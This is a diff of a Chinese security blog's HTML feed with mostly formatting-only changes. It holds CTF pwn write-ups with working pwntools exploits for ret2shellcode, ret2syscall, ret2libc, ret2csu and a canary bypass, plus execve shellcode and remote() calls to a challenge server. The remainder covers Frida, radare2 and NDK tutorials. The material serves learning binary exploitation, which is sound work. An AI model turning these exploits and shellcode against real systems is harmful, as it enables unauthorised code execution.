-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
-<span style="color:#75715e"># sh = process(./ret2shellcode)</span>
+<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
+<span style="color:#75715e"># sh = process(./ret2shellcode)</span>
 sh <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10002</span>)
-<span style="color:#75715e">## 获得system(&#34;bin/sh&#34;)的asm</span>
+<span style="color:#75715e">## 获得system(&#34;bin/sh&#34;)的asm</span>
 shellcode <span style="color:#f92672">=</span> asm(shellcraft<span style="color:#f92672">.</span>sh())
 buf2_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x804a080</span>
-<span style="color:#75715e"># sh.sendline(shellcode+&#34;\x90&#34;*(112-len(shellcode))+p32(buf2_addr))</span>
+<span style="color:#75715e"># sh.sendline(shellcode+&#34;\x90&#34;*(112-len(shellcode))+p32(buf2_addr))</span>
 sh<span style="color:#f92672">.</span>sendline(shellcode<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">112</span>,<span style="color:#e6db74">&#34;A&#34;</span>)<span style="color:#f92672">+</span>p32(buf2_addr))
 sh<span style="color:#f92672">.</span>interactive()
 </code></pre></div><p><img src="https://my-md-1253484710.file.myqcloud.com/20190407134402.png" alt=""></p>
@@ -2172,18 +2172,18 @@ _start:
  <span style="color:#960050;background-color:#1e0010">*/</span>
  <span style="color:#a6e22e">shellcode</span> <span style="color:#960050;background-color:#1e0010">=</span> <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xf6</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x48</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xbb</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x62</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x69</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6e</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x2f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x73</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x68</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x56</span><span style="color:#960050;background-color:#1e0010">&#34;</span>
     <span style="color:#960050;background-color:#1e0010">&#34;\</span><span style="color:#a6e22e">x53</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x54</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x5f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x6a</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x3b</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x58</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x31</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">xd2</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x0f</span><span style="color:#960050;background-color:#1e0010">\</span><span style="color:#66d9ef">x05</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#75715e">;
-</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
+</span></code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )</span>
+<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;x64&#39;,os = &#39;linux&#39; )</span>
 io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./shellcode&#39;</span>)
-<span style="color:#75715e"># io = remote(&#34;47.106.212.155&#34;,10003)</span>
+<span style="color:#75715e"># io = remote(&#34;47.106.212.155&#34;,10003)</span>
 shellcode <span style="color:#f92672">=</span>     <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><span style="color:#e6db74">&#34;</span>
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;[&#39;</span>)
 buf_addr <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;]&#39;</span>,drop<span style="color:#f92672">=</span>True)
 buf_addr <span style="color:#f92672">=</span> int(buf_addr,<span style="color:#ae81ff">16</span>)
-<span style="color:#75715e"># print(buf_addr)</span>
+<span style="color:#75715e"># print(buf_addr)</span>
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(buf_addr<span style="color:#f92672">+</span><span style="color:#ae81ff">32</span>) <span style="color:#f92672">+</span> shellcode
-<span style="color:#75715e"># 32是24字节的填充数据长度加返回地址长度24+8</span>
+<span style="color:#75715e"># 32是24字节的填充数据长度加返回地址长度24+8</span>
 <span style="color:#66d9ef">print</span> payload
 io<span style="color:#f92672">.</span>sendline(payload)
 io<span style="color:#f92672">.</span>interactive()
@@ -2202,10 +2202,10 @@ io<span style="color:#f92672">.</span>interactive()
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160123.png" alt=""></p>
 <p><img src="https://my-md-1253484710.file.myqcloud.com/20190407160710.png" alt=""></p>
 <p>写payload:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#coding:utf-8</span>
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
-<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
-<span style="color:#75715e"># io = process(./ret2syscall)</span>
+<span style="color:#75715e"># context(log_level = &#39;debug&#39;,arch =&#39;i386&#39;,os = &#39;linux&#39; )</span>
+<span style="color:#75715e"># io = process(./ret2syscall)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10004</span>)
 
 pop_eax_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x080bb196</span>
@@ -2237,13 +2237,13 @@ io<span style="color:#f92672">.</span>interactive()
 <p>exp1:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<span style="color:#75715e"># io = process(&#39;./ret2libc1&#39;)</span>
+<span style="color:#75715e"># io = process(&#39;./ret2libc1&#39;)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10006</span>)
 binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048720</span>
 sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>
 
 payload <span style="color:#f92672">=</span> flat([<span style="color:#ae81ff">112</span><span style="color:#f92672">*</span><span style="color:#e6db74">&#39;A&#39;</span>,sym_plt_addr,<span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">4</span>,binsh_addr])
-<span style="color:#75715e"># &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址</span>
+<span style="color:#75715e"># &#39;bbbb&#39; 作为函数调用栈返回地址的虚假的地址</span>
 
 io<span style="color:#f92672">.</span>sendline(payload)
 io<span style="color:#f92672">.</span>interactive()
@@ -2254,9 +2254,9 @@ io<span style="color:#f92672">.</span>interactive()
 <p>exp:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
 
-<span style="color:#75715e"># io = process(&#39;./ret2libc2&#39;)</span>
+<span style="color:#75715e"># io = process(&#39;./ret2libc2&#39;)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10007</span>)
-<span style="color:#75715e"># binsh_addr = 0x08048720</span>
+<span style="color:#75715e"># binsh_addr = 0x08048720</span>
 sym_plt_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048490</span>
 sym_imp_gets_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x08048460</span>
 pop_ebx_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0804872f</span>
@@ -2283,7 +2283,7 @@ io<span style="color:#f92672">.</span>interactive()
 <span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> LibcSearcher
 
 context(log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;debug&#39;</span>,arch <span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>,os <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;linux&#39;</span> )
-<span style="color:#75715e"># io = process(&#39;./ret2libc3&#39;)</span>
+<span style="color:#75715e"># io = process(&#39;./ret2libc3&#39;)</span>
 io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;47.106.212.155&#34;</span>,<span style="color:#ae81ff">10008</span>)
 elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2libc3&#39;</span>)
 puts_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
@@ -2307,9 +2307,9 @@ io<span style="color:#f92672">.</span>interactive()
 <p>利用 x64 下的 __libc_csu_init 中的 gadgets.</p>
 <p>eg:level5:</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#undef _FORTIFY_SOURCE
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vulnerable_function</span>() {
 	<span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>];
@@ -2333,9 +2333,9 @@ io<span style="color:#f92672">.</span>interactive()
 <h5 id="高级rop">高级ROP</h5>
 <h6 id="ret2_dl_runtime_resolve">ret2_dl_runtime_resolve</h6>
 <p>XDCTF2015-pwn200</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span>
 <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">vuln</span>()
 {
@@ -2383,7 +2383,7 @@ stack <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</
 success(<span style="color:#e6db74">&#34;stack -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(stack))
 
 
-<span style="color:#75715e">#  DEBUG(&#34;b *0x4006B9\nc&#34;) 96</span>
+<span style="color:#75715e">#  DEBUG(&#34;b *0x4006B9\nc&#34;) 96</span>
 io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">&#34;&gt;&#34;</span>, flat([<span style="color:#e6db74">&#39;11111111&#39;</span>, <span style="color:#ae81ff">0x400793</span>, elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;puts&#39;</span>], elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>], <span style="color:#ae81ff">0x400676</span>, (<span style="color:#ae81ff">80</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">40</span>) <span style="color:#f92672">*</span> <span style="color:#e6db74">&#39;1&#39;</span>, stack, <span style="color:#ae81ff">0x4006be</span>]))
 libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x7f</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#f92672">-</span><span style="color:#ae81ff">6</span>: ]<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#39;</span>)) <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;puts&#39;</span>]
 success(<span style="color:#e6db74">&#34;libc.address -&gt; {:#x}&#34;</span><span style="color:#f92672">.</span>format(libc<span style="color:#f92672">.</span>address))
@@ -2414,7 +2414,7 @@ addr_flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x400
 
 H,P <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#ae81ff">6666</span>
 
-<span style="color:#75715e">#r = process(&#39;./readme.bin&#39;)</span>
+<span style="color:#75715e">#r = process(&#39;./readme.bin&#39;)</span>
 r <span style="color:#f92672">=</span> remote(H,P)
 junk  <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;What&#39;s your name? &#34;</span>)
 exploit  <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x218</span>
@@ -2439,10 +2439,10 @@ junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>
 <p>泄露栈中的Canary</p>
 <p>覆盖 Canary 的低字节，来打印出剩余的 Canary 部分</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">// ex2.c
-</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e"></span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
+</span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt;</span><span style="color:#75715e">
 </span><span style="color:#75715e"></span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">getshell</span>(<span style="color:#66d9ef">void</span>) {
     system(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>);
 }
@@ -2465,28 +2465,28 @@ junk <span style="color:#f92672">+=</span> r<span style="color:#f92672">.</span>
     <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 }
 </code></pre></div><p>EXP</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python</span>
    
 <span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
    
-context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ex2&#39;</span><span style="color:#75715e">#全局系统自动设置，为官方推荐设置，ex2为文件名称。</span>
-<span style="color:#75715e">#context.log_level = &#39;debug&#39;#debug模式下才开启</span>
-io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ex2&#39;</span>) <span style="color:#75715e">#本地连接到ex2</span>
+context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;ex2&#39;</span><span style="color:#75715e">#全局系统自动设置，为官方推荐设置，ex2为文件名称。</span>
+<span style="color:#75715e">#context.log_level = &#39;debug&#39;#debug模式下才开启</span>
+io <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ex2&#39;</span>) <span style="color:#75715e">#本地连接到ex2</span>
    
-get_shell <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ex2&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;getshell&#34;</span>] <span style="color:#75715e">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。</span>
+get_shell <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./ex2&#34;</span>)<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#34;getshell&#34;</span>] <span style="color:#75715e">#由于源码里有getshell函数，所以直接可以使用ELF模块找到getshell函数地址。</span>
    
-io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello Hacker!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e">#接受传来的第一部分字符</span>
+io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;Hello Hacker!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)<span style="color:#75715e">#接受传来的第一部分字符</span>
    
-<span style="color:#75715e"># leak Canary</span>
+<span style="color:#75715e"># leak Canary</span>
 payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span> 
-io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#传输100个A</span>
+io<span style="color:#f92672">.</span>sendline(payload) <span style="color:#75715e">#传输100个A</span>
    
 io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span>)
-Canary <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa</span> <span style="color:#75715e">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a</span>
-log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Canary:&#34;</span><span style="color:#f92672">+</span>hex(Canary))<span style="color:#75715e">#日志记录下canary</span>
+Canary <span style="color:#f92672">=</span> u32(io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">4</span>))<span style="color:#f92672">-</span><span style="color:#ae81ff">0xa</span> <span style="color:#75715e">#因为cannary最后一位字节为00被0x0a覆盖，所以减去0x0a</span>
+log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">&#34;Canary:&#34;</span><span style="color:#f92672">+</span>hex(Canary))<span style="color:#75715e">#日志记录下canary</span>
    
-<span style="color:#75715e"># Bypass Canary</span>
-payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span>p32(Canary)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(get_shell)<span style="color:#75715e">#发送最后的payload</span>
+<span style="color:#75715e"># Bypass Canary</span>
+payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">100</span><span style="color:#f92672">+</span>p32(Canary)<span style="color:#f92672">+</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">12</span><span style="color:#f92672">+</span>p32(get_shell)<span style="color:#75715e">#发送最后的payload</span>
 io<span style="color:#f92672">.</span>send(payload)
    
 io<span style="color:#f92672">.</span>recv()
@@ -2506,7 +2506,7 @@ stop <span style="color:#f92672">=</span> len(p)<span style="color:#f92672">+</s
   
       <span style="color:#66d9ef">if</span> res <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;&#34;</span>:
          p <span style="color:#f92672">=</span> p <span style="color:#f92672">+</span> chr(i)
-         <span style="color:#75715e">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
+         <span style="color:#75715e">#print &#34;\t[+] Byte found 0x%02x&#34; % i</span>
          <span style="color:#66d9ef">break</span>
   
       <span style="color:#66d9ef">if</span> i <span style="color:#f92672">==</span> <span style="color:#ae81ff">255</span>:
@@ -2534,10 +2534,10 @@ canary <span style="color:#f92672">=</span> p[stop:start<span style="color:#f926
             
             <guid>https://kuekiko.top/posts/2019/02/frida%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83_2/</guid>
             <description>0x00 前言 复习一下Android安装frida命令
-adb rootadb push frida-server /data/local/tmpadb shell &amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34;adb shell &amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34;常用Frida 命令
-frida-ps -U #列出USB设备运行ing的进程frida-ps -Ua #列出运行中的应用frida-ps -Uai #列出已安装的应用列表frida-ps -D xxx #连接指定的设备frida-ps -R#在Safari中跟踪recv*和send* APIfrida-trace -i &amp;#34;recv*&amp;#34; -i &amp;#34;send&amp;#34; Safari #在Safari中跟踪ObjC方法调用frida-trace -m &amp;#34;-[NSView drawRect:]&amp;#34; Safari#在iPhone上启动SnapChat，跟踪加密API调用frida-trace -U -f com.app.testing -I &amp;#34;libcommonCrypto*&amp;#34;#当程序启动时，frida跟踪所有open functionfrida-trace -U -i open com.app.testing下面通过自己创建一个Android APP来学习Frida在Android上的一般用法。
+adb root adb push frida-server /data/local/tmp adb shell &amp;#34;chmod 755 /data/local/tmp/frida-server&amp;#34; adb shell &amp;#34;/data/local/tmp/frida-server &amp;amp;&amp;#34; 常用Frida 命令
+frida-ps -U #列出USB设备运行ing的进程 frida-ps -Ua #列出运行中的应用 frida-ps -Uai #列出已安装的应用列表 frida-ps -D xxx #连接指定的设备 frida-ps -R #在Safari中跟踪recv*和send* API frida-trace -i &amp;#34;recv*&amp;#34; -i &amp;#34;send&amp;#34; Safari #在Safari中跟踪ObjC方法调用 frida-trace -m &amp;#34;-[NSView drawRect:]&amp;#34; Safari #在iPhone上启动SnapChat，跟踪加密API调用 frida-trace -U -f com.app.testing -I &amp;#34;libcommonCrypto*&amp;#34; #当程序启动时，frida跟踪所有open function frida-trace -U -i open com.app.testing 下面通过自己创建一个Android APP来学习Frida在Android上的一般用法。
 0x01 简单用例 Frida常用的两种启动方式：
- python 绑定启动  import fridaimport sys,os## package name pkg_name = &amp;#34;com.</description>
+ python 绑定启动  import frida import sys,os ## package name pkg_name = &amp;#34;com.</description>
             <content type="html"><![CDATA[<h3 id="0x00-前言">0x00 前言</h3>
 <p>复习一下Android安装frida命令</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">adb root
@@ -2568,7 +2568,7 @@ frida-trace -U -i open com.app.testing
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> frida
 <span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span>os
 
-<span style="color:#75715e">## package name</span>
+<span style="color:#75715e">## package name</span>
 pkg_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;com.example.xxx&#34;</span>
 js_hook_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;xxx.js&#34;</span>
 
@@ -2577,7 +2577,7 @@ js_hook_file <span style="color:#f92672">=</span> <span style="color:#e6db74">&#
         <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;[*] {0}&#34;</span><span style="color:#f92672">.</span>format(message[<span style="color:#e6db74">&#39;payload&#39;</span>]))
     <span style="color:#66d9ef">else</span>:
         <span style="color:#66d9ef">print</span>(message)
-<span style="color:#75715e">## 插入js代码 or 加载js文件</span>
+<span style="color:#75715e">## 插入js代码 or 加载js文件</span>
 jscode <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
 
 script <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
@@ -2634,10 +2634,10 @@ Dynamic instrumentation toolkit for developers, reverse-engineers, and security 
  Failed to load the Frida native extension: DLL load failed: 找不到指定的模块
 报了这个错 查了大半天 原来我用的版本是基于python3.7编译的。我现在用的3.6.。。。。
  绑定：二选一就行
-pip install frida # Python bindingsnpm install frida # Node.js bindings手动编译 依赖：
+pip install frida # Python bindings npm install frida # Node.js bindings 手动编译 依赖：
 pip3 install colorama prompt-toolkit pygments
  Linux  make
- MacOS and iOS  export MAC_CERTID=frida-certexport IOS_CERTID=frida-certmake Windows  frida.</description>
+ MacOS and iOS  export MAC_CERTID=frida-cert export IOS_CERTID=frida-cert make  Windows  frida.</description>
             <content type="html"><![CDATA[<h3 id="0x00-frida">0x00 Frida</h3>
 <p>Frida 官网：https://www.frida.re/</p>
 <p>github: <a href="https://github.com/frida/frida">https://github.com/frida/frida</a></p>
@@ -2740,7 +2740,7 @@ cutter 是r2的GUI版。
 0x01 安装 支持的平台有如下：
  Windows (since XP), GNU/Linux, OS X, [Net|Free|Open]BSD, Android, iOS, OSX, QNX, Solaris, Haiku, FirefoxOS.
  Linux平台下直接
-git clone https://github.com/radare/radare2cd radare2sys/install.sh //(or sys/user.sh)Windows下可以下载二进制安装包安装。官网下载
+git clone https://github.com/radare/radare2 cd radare2 sys/install.sh //(or sys/user.sh) Windows下可以下载二进制安装包安装。官网下载
 Windows用户推荐使用Windows下的linux（wsl）来使用， win下更新慢。还是linux下用得舒服（方便，快捷）。
 0x03 工具介绍 r2常用的包含有一下组件：
  rax2 用于数值转换 rasm2 反汇编和汇编 rabin2 查看文件格式 radiff2 对文件进行 diff ragg2/ragg2­cc 开发shellcode工具 rahash2 各种密码算法， hash算法 radare2 整合了所有工具  使用帮助直接-h
@@ -3054,8 +3054,8 @@ NDK-Build的使用 可以参考官方文档。
   cd 项目目录
   /ndk-build 。也可以将NDK-build加入环境变量。
